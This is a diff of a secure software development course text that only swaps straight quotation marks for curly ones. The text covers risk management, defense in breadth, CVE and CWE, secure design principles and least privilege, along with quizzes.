+The Linux Foundation’s [*“Telemetry Data Collection and Usage Policy”*](https://www.linuxfoundation.org/telemetry-data-policy/) presents a brief discussion of some of the issues that should be considered before implementing telemetry data collection, as well as discussing the Foundation’s approach to managing use of telemetry by its open source project communities. This may be useful to you in other contexts.
 
 ### Quiz 1.3
 
@@ -408,7 +408,7 @@ The Linux Foundation’s [*"Telemetry Data Collection and Usage Policy"*](https:
 
 [ ] Under the GDPR, once consent is given it cannot be withdrawn. {{ selected: No, the GDPR requires that it be possible for users to be able to revoke consent. If there is no other legal reason that the data can be retained and processed, then the data must be erased. }}
 
-[ ] Under the GDPR, a prechecked "I agree" checkbox is enough to obtain consent. {{ selected: No, consent requires a “clear affirmative action”. Prechecked boxes do not count. }}
+[ ] Under the GDPR, a prechecked “I agree” checkbox is enough to obtain consent. {{ selected: No, consent requires a “clear affirmative action”. Prechecked boxes do not count. }}
 
 [x] Under the GDPR, data subjects can, under certain circumstances, demand to have their personal data erased.
 
@@ -422,7 +422,7 @@ Risks are *potential problems*. The key to developing adequately secure software
 
 All of life involves risk. It is unrealistic to expect that there will be no risks in life. In particular, there are risks to anyone using the software you develop because it may have vulnerabilities. When you develop software, you are likely to make mistakes, and some of those mistakes might eventually lead to security vulnerabilities. Someone may even try to intentionally insert vulnerabilities or malicious code into your software, or the software you depend on, during its development. Even very strong techniques for countering vulnerabilities must build on assumptions or can only eliminate *some* security-related risks, so again, it is unrealistic to expect there to be no risks.
 
-But when you develop software, you should take reasonable steps to *manage* risks so that the risks are so low (both to its developers and users) that they are acceptable. In his book, [*"The Failure of Risk management: Why It’s Broken and How to Fix It"*](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536) (2009), Douglas Hubbard defines risk management as the *“identification, evaluation, and prioritization of risks… followed by coordinated and economical application of resources to minimize, monitor, and control the probability or impact of unfortunate events”*.
+But when you develop software, you should take reasonable steps to *manage* risks so that the risks are so low (both to its developers and users) that they are acceptable. In his book, [*“The Failure of Risk management: Why It’s Broken and How to Fix It”*](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536) (2009), Douglas Hubbard defines risk management as the *“identification, evaluation, and prioritization of risks… followed by coordinated and economical application of resources to minimize, monitor, and control the probability or impact of unfortunate events”*.
 
 One of the risks when developing and deploying software is that attacker(s) will exploit its vulnerabilities and cause harm to others. You cannot prevent attackers from trying to attack the system. In fact:
 
@@ -460,7 +460,7 @@ Small projects with relatively low impacts can do risk management very informall
 
         4. Harden the system. Hardening a system means modifying a system so that defects are less likely to become security vulnerabilities. We will discuss hardening later in the course.
 
-5. **Risk Monitoring**. Determine how the risks have changed over time. Over time, you should "burn down" your risks - that is, the steps you are taking should be continuously reducing the risk likelihood or severity to acceptable levels.
+5. **Risk Monitoring**. Determine how the risks have changed over time. Over time, you should “burn down” your risks - that is, the steps you are taking should be continuously reducing the risk likelihood or severity to acceptable levels.
 
 Risk management is *not* complicated. It is basically common sense. But when you are working on solving the current problems it is easy to forget about risks, which are only *potential* problems. A little thought *ahead* of time can eliminate potential problems before they become real problems.
 
@@ -470,7 +470,7 @@ Note that the first step (beyond planning) is identifying risks. But how do you 
 
 Bruce Schneier has this wonderful story ([*The Security Mindset*](https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html), 2008): 
 
-> *"Uncle Milton Industries has been selling ant farms to children since 1956. Some years ago, I remember opening one up with a friend. There were no actual ants included in the box. Instead, there was a card that you filled in with your address, and the company would mail you some ants. My friend expressed surprise that you could get ants sent to you in the mail. [Bruce Schneier] replied: ‘What's really interesting is that these people will send a tube of live ants to anyone you tell them to.’ … Security requires a particular mindset. Security professionals -- at least the good ones -- see the world differently. They can't walk into a store without noticing how they might shoplift. They can't use a computer without wondering about the security vulnerabilities. They can't vote without trying to figure out how to vote twice."*
+> *“Uncle Milton Industries has been selling ant farms to children since 1956. Some years ago, I remember opening one up with a friend. There were no actual ants included in the box. Instead, there was a card that you filled in with your address, and the company would mail you some ants. My friend expressed surprise that you could get ants sent to you in the mail. [Bruce Schneier] replied: ‘What’s really interesting is that these people will send a tube of live ants to anyone you tell them to.’ … Security requires a particular mindset. Security professionals -- at least the good ones -- see the world differently. They can’t walk into a store without noticing how they might shoplift. They can't use a computer without wondering about the security vulnerabilities. They can't vote without trying to figure out how to vote twice.”*
 
 Can this mindset be taught? Our experience is that it can be, at least in part. Checklists, guidance, and tips help remind people to look for certain things, especially when they are built from relevant past experiences. Another technique that helps is working to develop a slightly paranoid mind-set. Not a clinical level of paranoia, but a constant low-level concern that there are many risks and that some people really are out to get you. Remember that some users will intentionally seek to cause rare, unlikely, or unexpected situations, in the hope that such attacks will give them unwarranted privileges. As a result, when writing secure programs, paranoia is a virtue. Talking about risks with others, reviewing plans with others, and continuously looking for risks can all help identify risks so that they can be addressed *before* they become problems.
 
@@ -478,11 +478,11 @@ Can this mindset be taught? Our experience is that it can be, at least in part. 
 
 In his essay, [*The Process of Security*](https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html) (2000), Bruce Schneier has famously explained that 
 
-> *"security is a process not a product… there's no such thing as perfect security. Interestingly enough, that's not necessarily a problem. … Security does not have to be perfect, but the risks have to be manageable…".*
+> *“security is a process not a product… there’s no such thing as perfect security. Interestingly enough, that's not necessarily a problem. … Security does not have to be perfect, but the risks have to be manageable…”.*
 
 The world changes. The ways your software is used changes. New vulnerabilities are discovered. The software’s platform and libraries change. Laws, company policies, and goals change.. Software that was secure a year or five ago may not be adequate today. 
 
-Since security is a process, it is not just "fire and forget." You need to continuously consider security.
+Since security is a process, it is not just “fire and forget.” You need to continuously consider security.
 
 #### Checklists Are Not Security
 
@@ -510,7 +510,7 @@ This is false. It would be great if we could eliminate all risks. But that is ra
 
 ### Development Processes / Defense-in-Breadth
 
-There is no single magic mechanism to make secure software. Instead, you have to continuously consider security throughout software development and deployment. Considering security at all times, through all development and deployment processes, is sometimes called "defense in breadth". So let’s talk about the processes used for software development and deployment.
+There is no single magic mechanism to make secure software. Instead, you have to continuously consider security throughout software development and deployment. Considering security at all times, through all development and deployment processes, is sometimes called “defense in breadth”. So let’s talk about the processes used for software development and deployment.
 
 #### Individual Software Development & Deployment Processes
 
@@ -532,7 +532,7 @@ Whenever you develop software there are certain processes that all developers ha
 
 Of course, you need to use these processes together.
 
-A common mistake is to try to execute these software development processes in a strict sequence (figure out all the requirements, then work out the entire design, then implement the entire system, then verify it). Attempting to create software in this strict sequence is called the *waterfall* model. The waterfall model is beguiling because doing these processes in strict sequence *appears* rigorous and sensible at first. In 1970, Winston W. Royce explained in his essay [*Managing the Development of Large Systems: Concepts and Techniques*](https://dl.acm.org/doi/10.5555/41765.41801) why trying to follow these processes in a strict sequence (a "waterfall") is extremely risky in most circumstances and should normally be avoided.
+A common mistake is to try to execute these software development processes in a strict sequence (figure out all the requirements, then work out the entire design, then implement the entire system, then verify it). Attempting to create software in this strict sequence is called the *waterfall* model. The waterfall model is beguiling because doing these processes in strict sequence *appears* rigorous and sensible at first. In 1970, Winston W. Royce explained in his essay [*Managing the Development of Large Systems: Concepts and Techniques*](https://dl.acm.org/doi/10.5555/41765.41801) why trying to follow these processes in a strict sequence (a “waterfall”) is extremely risky in most circumstances and should normally be avoided.
 
 Another common mistake is to implement software components independently and never integrate and test them together until everything is completed independently. This is typically a mistake, because this leads to serious problems getting the components to work together.
 
@@ -542,17 +542,17 @@ A highly recommended practice is to use Continuous Integration (CI), the practic
 
 Many organizations want to deploy software/services more rapidly, and have adopted various approaches to do that building on these standard software development processes. Definitions vary, but here are some common terms:
 
-* Continuous Delivery (CDE) aims to ensure *"an application is always at production-ready state after successfully passing automated tests and quality checks [by employing practices] to deliver software automatically to a production-like environment"* (Mojtaba Shahin, Muhammad Ali Babar, and Liming Zhu, [*Continuous Integration, Delivery and Deployment: A Systematic Review on Approaches, Tools, Challenges and Practices*](https://arxiv.org/abs/1703.07019), 2017). Note that the software is not actually released/deployed without a separate manual approval step.
+* Continuous Delivery (CDE) aims to ensure *“an application is always at production-ready state after successfully passing automated tests and quality checks [by employing practices] to deliver software automatically to a production-like environment”* (Mojtaba Shahin, Muhammad Ali Babar, and Liming Zhu, [*Continuous Integration, Delivery and Deployment: A Systematic Review on Approaches, Tools, Challenges and Practices*](https://arxiv.org/abs/1703.07019), 2017). Note that the software is not actually released/deployed without a separate manual approval step.
 
-* Continuous Deployment (CD) *"goes a step further [than continuous delivery] and automatically and continuously deploys the application to production or customer environments"* (Mojtaba Shahin, Muhammad Ali Babar, and Liming Zhu, [*Continuous Integration, Delivery and Deployment: A Systematic Review on Approaches, Tools, Challenges and Practices*](https://arxiv.org/abs/1703.07019), 2017).
+* Continuous Deployment (CD) *“goes a step further [than continuous delivery] and automatically and continuously deploys the application to production or customer environments”* (Mojtaba Shahin, Muhammad Ali Babar, and Liming Zhu, [*Continuous Integration, Delivery and Deployment: A Systematic Review on Approaches, Tools, Challenges and Practices*](https://arxiv.org/abs/1703.07019), 2017).
 
-* DevOps focuses on coordination and cooperation between the software development (Dev) and IT operations (Ops) teams (Mike Loukides, [*Revisiting "What Is DevOps"*](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html), 2014), e.g., to shorten development and deployment time. In practice, this typically includes Continuous Delivery (CDE) and may include Continuous Deployment (CD).
+* DevOps focuses on coordination and cooperation between the software development (Dev) and IT operations (Ops) teams (Mike Loukides, [*Revisiting “What Is DevOps”*](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html), 2014), e.g., to shorten development and deployment time. In practice, this typically includes Continuous Delivery (CDE) and may include Continuous Deployment (CD).
 
 * DevSecOps (also called SecDevOps) is DevOps, but specifically integrating security concerns into the development and operations process (Red Hat, [*What Is DevSecOps?*](https://www.redhat.com/en/topics/devops/what-is-devsecops))
 
-All these depend on automated tests and quality checks, and from a security perspective, what is critical is that tools to check for security vulnerabilities and potential security issues need to be integrated into those automated tests and quality checks. For example, you should ensure that tools are in your CI pipeline that check for various security issues, so that any security problems are detected early. Security tools that take a long time to run might be run in parallel but be used as a "gate" for CDE. We will discuss much more about tools to support security later in the course.
+All these depend on automated tests and quality checks, and from a security perspective, what is critical is that tools to check for security vulnerabilities and potential security issues need to be integrated into those automated tests and quality checks. For example, you should ensure that tools are in your CI pipeline that check for various security issues, so that any security problems are detected early. Security tools that take a long time to run might be run in parallel but be used as a “gate” for CDE. We will discuss much more about tools to support security later in the course.
 
-Simply inserting some "security tools" into an automated test suite, by itself, tends to be ineffective. Security tools will not generally know what the software is supposed to do (the requirements). For example, security tools will not know what information is confidential. Security tools usually cannot detect fundamental problems in the software design, and even if they could, fixing design problems is not what detection tools do.  Security tools often miss vulnerabilities, especially if the software is poorly designed. And perhaps most importantly, information from security tools generally do not make sense to developers if they do not have a basic understanding about security. There is an old phrase that is still true: *“a fool with a tool is still a fool”*.
+Simply inserting some “security tools” into an automated test suite, by itself, tends to be ineffective. Security tools will not generally know what the software is supposed to do (the requirements). For example, security tools will not know what information is confidential. Security tools usually cannot detect fundamental problems in the software design, and even if they could, fixing design problems is not what detection tools do.  Security tools often miss vulnerabilities, especially if the software is poorly designed. And perhaps most importantly, information from security tools generally do not make sense to developers if they do not have a basic understanding about security. There is an old phrase that is still true: *“a fool with a tool is still a fool”*.
 
 **In short:** Tools are important, but not enough. You must continuously consider security throughout development and deployment, no matter what you are doing, so you can identify and handle security-related risks. Consider how your system might be attacked (identifying its risks), analyze risks to determine how likely the system could be exploited and the severity if it was, and then decide what to do. That definitely includes adding security tools in your continuous integration pipeline, but those tools will be far more effective if you think about security throughout development and deployment. In the rest of this course we will cover how to do that. We will eventually discuss tools, but only after we understand what the tools are helping us do.
 
@@ -568,7 +568,7 @@ You also should focus on continuous improvement, of both the software itself and
 
 [Explanation]
 
-This is false. This is a "waterfall" approach and is generally a very risky way to develop software. You do need to have an idea of what you are trying to achieve, of course, but reality is more complex: as you design, implement, and field, you will get feedback into what the requirements really *should* be.
+This is false. This is a “waterfall” approach and is generally a very risky way to develop software. You do need to have an idea of what you are trying to achieve, of course, but reality is more complex: as you design, implement, and field, you will get feedback into what the requirements really *should* be.
 
 [Explanation]
 
@@ -586,7 +586,7 @@ This is false, but it is a sneaky question because there is a grain of truth in 
 
 It is definitely important to have security tools in your continuous integration pipeline. No matter how good your design and implementation approach is, you will make mistakes, and tools in the continuous integration pipeline will help you find some of those mistakes.
 
-But simply "adding security tools" is not enough. No tool can fix a bad design, and tools will miss implementation vulnerabilities. You must think about security no matter what you are doing during development and operations.
+But simply “adding security tools” is not enough. No tool can fix a bad design, and tools will miss implementation vulnerabilities. You must think about security no matter what you are doing during development and operations.
 
 [Explanation]
 
@@ -596,21 +596,21 @@ Software is developed to be used, so let’s briefly look at security from the v
 
 Organizations should not assume that they can always protect their systems from attack. Attackers sometimes break through. For example, the [US NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) identifies five concurrent and continuous functions organizations should apply in their operations to manage cybersecurity risk:
 
-1. **Identify**<br>*"Develop an organizational understanding to manage cybersecurity risk to systems, people, assets, data, and capabilities".*
+1. **Identify**<br>*“Develop an organizational understanding to manage cybersecurity risk to systems, people, assets, data, and capabilities”.*
 
-2. **Protect**<br>*"Develop and implement appropriate safeguards to **ensure** delivery of critical services".*
+2. **Protect**<br>*“Develop and implement appropriate safeguards to **ensure** delivery of critical services”.*
 
-3. **Detect**<br>*"Develop and implement appropriate activities to identify the occurrence of a cybersecurity event".*
+3. **Detect**<br>*“Develop and implement appropriate activities to identify the occurrence of a cybersecurity event”.*
 
-4. **Respond**<br>"Develop and implement appropriate activities to take action regarding a detected cybersecurity incident".
+4. **Respond**<br>“Develop and implement appropriate activities to take action regarding a detected cybersecurity incident”.
 
-5. **Recover**<br>*"Develop and implement appropriate activities to maintain plans for resilience and to restore any capabilities or services that were impaired due to a cybersecurity incident".*
+5. **Recover**<br>*“Develop and implement appropriate activities to maintain plans for resilience and to restore any capabilities or services that were impaired due to a cybersecurity incident”.*
 
 This list of five functions is sometimes simplified to three basic functions: **protect**, **detect**, and **respond**. When using this simplified list of three basic functions, identify is considered part of protect, and recover is considered part of respond. We will use that shortened list of basic functions here.
 
 None of these three basic functions (protect, detect, and respond) is effective by itself. If you only protect, but don’t detect or recover, then an attacker who breaks through your defenses can do whatever they want. If you only detect or recover, without protecting your system, you will never get any work done; you will instead spend all your time on detection or recovery, and soon no one will trust your system. In addition, recovery is useless without detection, because you often won’t know *when* to recover.
 
-We will talk a lot about protection measures. It is typically cheaper to prevent problems than deal with them later (old proverbs apply here, e.g., *"an ounce of prevention is worth a pound of cure"*). But we will also discuss measures to detect and respond, because they are also necessary. At the very least, larger applications should include mechanisms like logging (to support detection) and backup (to support recovery), because they are necessary in applications we deploy.
+We will talk a lot about protection measures. It is typically cheaper to prevent problems than deal with them later (old proverbs apply here, e.g., *“an ounce of prevention is worth a pound of cure”*). But we will also discuss measures to detect and respond, because they are also necessary. At the very least, larger applications should include mechanisms like logging (to support detection) and backup (to support recovery), because they are necessary in applications we deploy.
 
 ### Quiz 1.7
 
@@ -626,13 +626,13 @@ We will talk a lot about protection measures. It is typically cheaper to prevent
 
 A vulnerability is simply a failure to meet some security requirement. Typically vulnerabilities are unintentional, but vulnerabilities can be intentional. For example, someone may have intentionally inserted malicious code (or at least attempted to do so) in the software you reuse or develop, such as a backdoor (a way to gain unauthorized access) or a logic bomb (code that performs a malicious function when specified conditions are met). This course focuses strictly on software, though of course hardware can also have vulnerabilities.
 
-Modern society depends on software (and hardware), and as a result, there has been a massive growth in the number of publicly-known vulnerabilities. This has made it difficult to answer simple questions like, *"did you fix this particular vulnerability"*? Next, we will outline some efforts that have been made to identify and address known vulnerabilities.
+Modern society depends on software (and hardware), and as a result, there has been a massive growth in the number of publicly-known vulnerabilities. This has made it difficult to answer simple questions like, *“did you fix this particular vulnerability"*? Next, we will outline some efforts that have been made to identify and address known vulnerabilities.
 
 #### Reporting and Handling Vulnerabilities - A Brief Summary
 
 There are many people who have, for one reason or or another, found security vulnerabilities in software. Some people, called security researchers, make finding vulnerabilities part of their career.
 
-In most cases, these vulnerability finders report the vulnerability to the software supplier(s) through a *"timed coordinated disclosure"* process. The finders privately report the vulnerability to the supplier(s), giving the supplier(s) some limited time (called the *“embargo time”*) to fix the vulnerability. After this embargo time (typically 14-90 days), or when the vulnerability has been fixed and users have had an opportunity to install the upgraded version of the software, the vulnerability is publicly disclosed. Sometimes this process is just called *“coordinated disclosure"*, but we want to make it unambiguously clear that in this process, the vulnerability will be publicly disclosed if the supplier fails to fix it in a timely manner.
+In most cases, these vulnerability finders report the vulnerability to the software supplier(s) through a *“timed coordinated disclosure”* process. The finders privately report the vulnerability to the supplier(s), giving the supplier(s) some limited time (called the *“embargo time”*) to fix the vulnerability. After this embargo time (typically 14-90 days), or when the vulnerability has been fixed and users have had an opportunity to install the upgraded version of the software, the vulnerability is publicly disclosed. Sometimes this process is just called *“coordinated disclosure”*, but we want to make it unambiguously clear that in this process, the vulnerability will be publicly disclosed if the supplier fails to fix it in a timely manner.
 
 In practice, things are more complicated. Often there are multiple suppliers and other stakeholders involved. It is critically important that you (as a developer/supplier) prepare ahead-of-time so that people can easily report vulnerabilities to you, so that you can privately discuss the issue with trusted parties, and so that you can rapidly fix any issues. Later in this course we will further discuss how to accept and report vulnerabilities, including references to useful documents about it. In addition, there is so much software and so many vulnerabilities that there is a need to track vulnerabilities. This need for tracking led to the creation of something called Common Vulnerabilities and Exposures (CVE).
 
@@ -640,7 +640,7 @@ In practice, things are more complicated. Often there are multiple suppliers and
 
 Common Vulnerabilities and Exposures (CVE) is a global dictionary of (some) publicly disclosed cybersecurity vulnerabilities. The goal of CVE is to make it easier to share data about vulnerabilities. A CVE entry has an identification number (ID), description, and at least one public reference. CVE IDs have the form CVE-*year*-*number*, where *year* is the year it was reported and *number* is an arbitrary positive integer to ensure that CVE IDs are unique. For example, [CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160) is a specific vulnerability in OpenSSL (called the Heartbleed  vulnerability) that was first reported in 2014. There are databases, such as the [US National Vulnerability Database (](https://nvd.nist.gov/)[NVD](https://nvd.nist.gov/)[)](https://nvd.nist.gov/), that track the current public set of CVE entries.
 
-CVEs are assigned by a CVE Numbering Authority (CNA). A CNA is simply an organization authorized to assign CVE IDs to vulnerabilities affecting products within some scope defined in advance. The primary CNA (aka "CNA of last resort") can assign a CVE even if no one else can (this role is currently filled by [MITRE](https://www.mitre.org/)). Many CNAs are software product developers (such as Microsoft and Red Hat) who assign CVE numbers for their own products. There are also third-party coordinators for vulnerabilities, such as the [CERT Coordination Center](https://sei.cmu.edu/about/divisions/cert/index.cfm), who are CNAs. Each CNA is given a block of integers that it can use in CVEs. This means that CVE-2025-50000 does not mean that it is vulnerability number 50,000 in the year 2025, but merely that the CNA who assigned that CVE ID was authorized to assign 50,000 in the year 2025.
+CVEs are assigned by a CVE Numbering Authority (CNA). A CNA is simply an organization authorized to assign CVE IDs to vulnerabilities affecting products within some scope defined in advance. The primary CNA (aka “CNA of last resort”) can assign a CVE even if no one else can (this role is currently filled by [MITRE](https://www.mitre.org/)). Many CNAs are software product developers (such as Microsoft and Red Hat) who assign CVE numbers for their own products. There are also third-party coordinators for vulnerabilities, such as the [CERT Coordination Center](https://sei.cmu.edu/about/divisions/cert/index.cfm), who are CNAs. Each CNA is given a block of integers that it can use in CVEs. This means that CVE-2025-50000 does not mean that it is vulnerability number 50,000 in the year 2025, but merely that the CNA who assigned that CVE ID was authorized to assign 50,000 in the year 2025.
 
 Many publicly-known vulnerabilities do not have CVE assignments. First of all, CVEs are only assigned if someone requests an assignment from a CNA; if no request is made, there will be no CVE. In addition, CVEs are intentionally limited in scope. CVEs are only granted for software that has been publicly released (including pre-releases if they are widely used). CVEs are generally not assigned to custom-built software that is not distributed. They are also not normally assigned to online services. That said, CVEs are the most widely used method for giving a unique identifier for each publicly-known vulnerability, so it is important to know about them.
 
@@ -648,11 +648,11 @@ Many publicly-known vulnerabilities do not have CVE assignments. First of all, C
 
 The vast majority of vulnerabilities can be grouped into categories. That turns out to be very useful; once we identify categories, we can determine which ones are common and what steps we can take to prevent those kinds of vulnerabilities from happening again.
 
-The [Common Weaknesses Enumeration (CWE)](https://cwe.mitre.org/) is a very long list of common weaknesses. In their terminology, a "weakness" is a category (type) of vulnerability. Note the difference between CVE and CWE:  a CWE identifies a *type* of vulnerability, while a CVE identifies a *specific* vulnerability in a particular (family of) products. Each CWE has an identifier with a number, e.g., CWE-20. We will mention CWE from time to time. However, the CWE is a large list, and we cannot cover all CWEs in this course.
+The [Common Weaknesses Enumeration (CWE)](https://cwe.mitre.org/) is a very long list of common weaknesses. In their terminology, a “weakness” is a category (type) of vulnerability. Note the difference between CVE and CWE:  a CWE identifies a *type* of vulnerability, while a CVE identifies a *specific* vulnerability in a particular (family of) products. Each CWE has an identifier with a number, e.g., CWE-20. We will mention CWE from time to time. However, the CWE is a large list, and we cannot cover all CWEs in this course.
 
 People have identified the most important or top kinds of vulnerabilities in terms of their likelihood and severity. Two of the most popular lists of top kinds of vulnerabilities are:
 
-1. [**OWASP Top 10 Web Application Security Risks**](https://owasp.org/www-project-top-ten/)<br>This list, developed by the Open Web Application Security Project (OWASP), represents a *"broad consensus about the most critical security risks to web applications."*
+1. [**OWASP Top 10 Web Application Security Risks**](https://owasp.org/www-project-top-ten/)<br>This list, developed by the Open Web Application Security Project (OWASP), represents a *“broad consensus about the most critical security risks to web applications.”*
 
 2. [**CWE Top 25 List**](https://cwe.mitre.org/top25/archive/2019/2019_cwe_top25.html)<br>This is a list of the most widespread and critical kinds of vulnerabilities. It was created by the Common Weaknesses Enumeration (CWE) Team by analyzing data about publicly-known vulnerabilities over many years. This list can be applied to any software, but it is especially common to apply it to software that is not a web application (since the OWASP list focuses on web applications). One interesting quirk: they identify important weaknesses beyond the first 25, so you can see numbers larger than 25 associated with this list.
 
@@ -688,7 +688,7 @@ Identifying common kinds of vulnerabilities has another advantage, too: It will 
 
 (!) All publicly-known vulnerabilities are assigned CVE IDs. {{No, someone has to request a CVE ID. In addition, CVEs are only granted for software that has been publicly released (including pre-releases if they are widely used). CVEs are generally not assigned to custom-built software that is not distributed. They are also not normally assigned to online services.}}
 
-( ) All CVEs are assigned by the MITRE Corporation. {{No, CVEs are assigned by a "CVE Numbering Authority" (CNA.)}}
+( ) All CVEs are assigned by the MITRE Corporation. {{No, CVEs are assigned by a “CVE Numbering Authority” (CNA.)}}
 
 (x) Avoiding common kinds of vulnerabilities is not enough by itself to make software secure, but it can be a significant help.
 
@@ -702,7 +702,7 @@ Learning objectives:
 
 2. Discuss the concept of least privilege.
 
-3. Discuss complete mediation ("non-bypassability"), including common mistakes.
+3. Discuss complete mediation (“non-bypassability”), including common mistakes.
 
 4. Understand input validation on an environment you can trust.
 
@@ -712,7 +712,7 @@ Learning objectives:
 
 ### What Are Security Design Principles?
 
-When you write non-trivial software, you have to break the problem into smaller components that work together. This process of deciding how to break a problem into components and how they will work together is called *design* or *architectural design*. For example, you are designing when you are trying to decide how to break a problem into a particular set of classes and methods. The result of those decisions is also called a design or architectural design. The word "design" is also used to describe user interface design, but that is not the sense we mean here.
+When you write non-trivial software, you have to break the problem into smaller components that work together. This process of deciding how to break a problem into components and how they will work together is called *design* or *architectural design*. For example, you are designing when you are trying to decide how to break a problem into a particular set of classes and methods. The result of those decisions is also called a design or architectural design. The word “design” is also used to describe user interface design, but that is not the sense we mean here.
 
 Remember that the design process, like any other software development process, doesn’t happen just once. It is really common to try to implement some software, realize that the design doesn’t work, and then change the design. You often have to change a design when you change what the software does. So the design process happens whenever you think about changing how to break the problem down in your software.
 
@@ -752,11 +752,11 @@ In their list they focus on the *protection system* - that is, the part of the s
 
 3. **Economy of mechanism (aka simplicity)**<br>The system, in particular the part that security depends on, should be as simple and small as possible.
 
-4. **Open design**<br>The protection mechanism must not depend on attacker ignorance. Instead, you should act as if the mechanism is publicly known, and instead depend on the secrecy of relatively few and easily changeable items like passwords or private keys. An attacker should not be able to break into a system just because the attacker knows how it works. "Security through obscurity" generally does not work.
+4. **Open design**<br>The protection mechanism must not depend on attacker ignorance. Instead, you should act as if the mechanism is publicly known, and instead depend on the secrecy of relatively few and easily changeable items like passwords or private keys. An attacker should not be able to break into a system just because the attacker knows how it works. “Security through obscurity” generally does not work.
 
 5. **Fail-safe defaults**<br>The default installation should be the secure installation. If it’s not certain that something should be allowed, don’t allow it.
 
-6. **Separation of privilege (e.g., use two-factor authentication)**<br>Access to objects should depend on more than one condition (such as having a password). That way, if an attacker manages to break one condition (e.g., by stealing a key) the system remains secure. Note: sometimes programs are broken into parts, each part with a different privilege. This approach is sometimes confusingly called "privilege separation" - but breaking a program into parts with different privileges is something else. In this terminology, that is an example of least privilege.
+6. **Separation of privilege (e.g., use two-factor authentication)**<br>Access to objects should depend on more than one condition (such as having a password). That way, if an attacker manages to break one condition (e.g., by stealing a key) the system remains secure. Note: sometimes programs are broken into parts, each part with a different privilege. This approach is sometimes confusingly called “privilege separation” - but breaking a program into parts with different privileges is something else. In this terminology, that is an example of least privilege.
 
 7. **Least common mechanism (aka minimize sharing)**<br>Minimize the amount and use of shared mechanisms. Avoid sharing files, directories, operating system kernel execution, or computers with something you do not trust, because attackers might exploit them.
 
@@ -778,7 +778,7 @@ Next, we will look in more detail at a few of these principles, because they hav
 
 [Explanation]
 
-The "open design" principle says that we cannot depend on attackers not knowing how a system works. Instead, we need to design our systems so that they stay secure even when the attacker knows exactly how it works.
+The “open design” principle says that we cannot depend on attackers not knowing how a system works. Instead, we need to design our systems so that they stay secure even when the attacker knows exactly how it works.
 
 [Explanation]
 
@@ -818,11 +818,11 @@ Here are several ways to implement least privilege, depending on the circumstanc
 
 Let’s take a look at a few specific examples.
 
-When developing web-based applications, do not allow users to access (read) files such as the server’s **include** and **configuration** files. This data may accidentally provide enough information (e.g., passwords) to break into the system. If you are using a traditional web server, keep everything you don’t need to serve directly to users outside the "documentation root" (**DOCROOT**); that way, attackers cannot even easily request the information. Deny serving files that you know should not be directly served (such as **include** files).
+When developing web-based applications, do not allow users to access (read) files such as the server’s **include** and **configuration** files. This data may accidentally provide enough information (e.g., passwords) to break into the system. If you are using a traditional web server, keep everything you don’t need to serve directly to users outside the “documentation root” (**DOCROOT**); that way, attackers cannot even easily request the information. Deny serving files that you know should not be directly served (such as **include** files).
 
 Don’t allow users to write system configuration files by default (e.g., system files in **/etc** on Linux and Unix), and, where practical, consider preventing reads by normal users as well. The problem is that system administrators often put passwords and keys in configuration files. If there are reasons to give broader read permissions to some of the system configuration information (e.g., in **/etc**), consider creating a system configuration directory instead of a system configuration file where the directory name conventionally ends in **.d**. System configuration directories are often better anyway, because they make it trivial for package managers to add and remove specific configuration files. For security, system configuration directories not only reduce the risk of error, but specific files (such as those with secret keys and passwords) can have more restricted permissions. If you use a system configuration directory, it is less of a problem to allow user read, because it is much easier to protect the secret keys and passwords.
 
-If you implement an external API (e.g., with REST or GraphQL), don’t provide a "write" operation unless you expect it to be used. If you allow writes, try to maximally limit *who* can write. For example, have owners of specific data and only let owners modify that data, instead of allowing anyone to modify anything. If practical, design your software so it cannot write data *even* if it is subverted by an attacker (though this often is not practical).
+If you implement an external API (e.g., with REST or GraphQL), don’t provide a “write” operation unless you expect it to be used. If you allow writes, try to maximally limit *who* can write. For example, have owners of specific data and only let owners modify that data, instead of allowing anyone to modify anything. If practical, design your software so it cannot write data *even* if it is subverted by an attacker (though this often is not practical).
 
 It is unfortunately common to mismanage privileges. For example, there are many cases where programs have failed to drop privileges in all cases (e.g., because raising an exception skipped the code that dropped privileges, or because the code that was supposed to drop privileges does not work in all cases).
 
@@ -830,7 +830,7 @@ It is unfortunately common to mismanage privileges. For example, there are many 
 
 ### Quiz 2.3
 
-\>\>One way you *might* be able to implement some of the "least privilege" privilege (depending on the program) is to use SQL GRANT statements so the program doesn’t have the rights to change certain data even if an attacker takes control of that program. True or False?<<
+\>\>One way you *might* be able to implement some of the “least privilege” privilege (depending on the program) is to use SQL GRANT statements so the program doesn’t have the rights to change certain data even if an attacker takes control of that program. True or False?<<
 
 (!) False.
 
@@ -862,7 +862,7 @@ An Insecure JavaScript Application
 
 #### Secure Design: Input Validation on an Environment You Can Trust
 
-You can use JavaScript securely, you just need to do it correctly. You can send JavaScript to the client, and you can do some security-relevant checks in the browser (say, to give quick feedback). But if attackers could control some web browsers (but not the servers), the browser-side security checks are irrelevant for security. In this common case, you have to do all security-related input checks in the servers, even if some of the checks were supposed to be done on the client and are now being "redone". The input checks (validations) are not really being redone, because the client-side ones could not be trusted.
+You can use JavaScript securely, you just need to do it correctly. You can send JavaScript to the client, and you can do some security-relevant checks in the browser (say, to give quick feedback). But if attackers could control some web browsers (but not the servers), the browser-side security checks are irrelevant for security. In this common case, you have to do all security-related input checks in the servers, even if some of the checks were supposed to be done on the client and are now being “redone”. The input checks (validations) are not really being redone, because the client-side ones could not be trusted.
 
 The following figure shows a similar but secure design; notice that all the security-related checks are being done in the server, since in this case that is the system we can trust. It also prevents direct database access, which is often a good idea if users do not need direct access:
 
@@ -877,7 +877,7 @@ A similar common insecure design is code in smartphone mobile applications that 
 
 #### Insecure Design: Client Application Depending on Untrusted Server
 
-Don’t be confused; the message is not *"server good, client bad"*. The issue is that in almost all cases, any code you need to trust must run in an environment you can trust.
+Don’t be confused; the message is not *“server good, client bad”*. The issue is that in almost all cases, any code you need to trust must run in an environment you can trust.
 
 If you’re writing a web browser, for example, you will need to trust the local operating system services, but you certainly cannot trust arbitrary remote web servers - some of those remote web servers may send you malicious data!
 
@@ -939,7 +939,7 @@ Let’s briefly look at the rest of the secure design principles identified by S
 
